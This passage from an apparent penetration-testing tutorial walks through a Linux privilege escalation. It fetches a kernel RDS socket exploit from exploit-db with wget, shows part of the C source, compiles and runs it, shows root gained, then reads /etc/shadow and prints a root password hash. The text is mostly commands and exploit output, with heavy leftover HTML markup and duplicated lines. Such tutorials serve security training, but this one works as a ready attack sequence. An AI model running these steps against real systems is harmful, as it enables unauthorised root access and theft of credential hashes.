`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">--2011-12-28 00:48:01-- <a href="http://www.exploit-db.com/download/15285" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://www.exploit-db.com/download/15285</a> `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Resolving www.exploit-db.com... 199.27.135.111, 199.27.134.111 `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Connecting to www.exploit-db.com|199.27.135.111|:80... connected. `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">HTTP request sent, awaiting response... 301 Moved Permanently `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Location: <a href="http://www.exploit-db.com/download/15285/" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://www.exploit-db.com/download/15285/</a> [following] `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">--2011-12-28 00:48:02-- <a href="http://www.exploit-db.com/download/15285/" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://www.exploit-db.com/download/15285/</a> `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Connecting to www.exploit-db.com|199.27.135.111|:80... connected. `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">HTTP request sent, awaiting response... 200 OK `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Length: 7154 (7.0K) [application/txt] `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Saving to: `roro.c' `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">0K ...... 100% 29.7K=0.2s`

 

  

 

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan47-300x119.png)

We used wget command to fetch exploit from exploit-db.com and used –O to rename it to roro.c

Note: linux kernel exploits mostly is being delopped in c language so we saved it in .c extension, just view exploit source and you will find

 \#include 

  

 \#include 

  

 \#include 

  

 \#include 

  

 \#include 

  

 \#include 

  

 \#include 

  

 \#include 

  

 \#include 

  

 \#include 

  

 \#include 

  

 

  

 \#define RECVPORT 5555

  

 \#define SENDPORT 6666

  

 

  

 int prep\_sock(int port)

  

 {

  

 

  

 int s, ret;

  

 struct sockaddr\_in addr;

  

 

  

 s = socket(PF\_RDS, SOCK\_SEQPACKET, 0);

  

 

  

 if(s < 0) {

  

 printf(“[\*] Could not open socket.n”);

  

 exit(-1);

  

 }

  

 

  

 memset(&addr, 0, sizeof(addr));

  

All the above lines indicate that this is exploit is written in C language

After we saved our exploit on server, we will compile it to elf format by typing

gcc roro.c –o roro

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan48-300x14.png)

And run our exploit by typing

[?](http://resources.infosecinstitute.com/hacking-a-wordpress-site/#)

 01

02

03

04

05

06

07

08

09

10

11

12

13

14

15

16

17

18

19

20

  `<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">./roro `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[*] Linux kernel >= 2.6.30 RDS socket exploit `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[*] by Dan Rosenberg `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[*] Resolving kernel addresses... `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[+] Resolved rds_proto_ops to 0xe09f0b20 `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[+] Resolved rds_ioctl to 0xe09db06a `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[+] Resolved commit_creds to 0xc044e5f1 `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[+] Resolved prepare_kernel_cred to 0xc044e452 `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[*] Overwriting function pointer... `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[*] Linux kernel >= 2.6.30 RDS socket exploit `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[*] by Dan Rosenberg `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[*] Resolving kernel addresses... `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[+] Resolved rds_proto_ops to 0xe09f0b20 `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[+] Resolved rds_ioctl to 0xe09db06a `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[+] Resolved commit_creds to 0xc044e5f1 `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[+] Resolved prepare_kernel_cred to 0xc044e452 `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[*] Overwriting function pointer... `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[*] Triggering payload... `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[*] Restoring function pointer...`

 

  

 

And after that we type

`<code style="margin: 0px; padding: 0px;">Id`

We will find that we are root J

`<code style="margin: 0px; padding: 0px;">uid=0(root) gid=0(root)`

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan49-300x36.png)

We can now view /etc/shadow file

[?](http://resources.infosecinstitute.com/hacking-a-wordpress-site/#)

 01

02

03

04

05

06

07

08

09

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

36

37

  `<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">cat /etc/shadow `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">root:$6$4l1OVmLPSV28eVCT$FqycC5mozZ8mqiqgfudLsHUk7R1EMU/FXw3pOcOb39LXekt9VY6HyGkXcLEO.ab9F9t7BqTdxSJvCcy.iYlcp0:14981:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">bin:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">daemon:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">adm:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">lp:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">sync:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">shutdown:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">halt:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">mail:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">uucp:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">operator:*:14495:0:99999:7::: `

